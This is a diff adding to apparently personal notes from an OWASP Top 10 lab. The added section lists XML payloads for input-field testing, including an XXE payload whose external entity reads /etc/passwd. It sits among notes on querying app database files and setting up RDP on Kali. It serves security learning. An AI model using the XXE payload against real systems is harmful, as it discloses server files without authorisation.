@@ -6162,6 +6162,20 @@ Lab OwaspTop10
    	SELECT * FROM table-name;
     	Importante olhar na pasta assets para encontrar os arquivos.db
 
+XML payloads for testing on input fields
+
+	<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ 	<userInfo>
+  	<firstName>falcon</firstName>
+  	<lastName>&name;</lastName>
+ 	</userInfo>
+.
+
+	<?xml version="1.0"?>
+	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+	<root>&read;</root>
+
+
 ## SETTING RDP with Xfce on KALI
 
 Now run the following
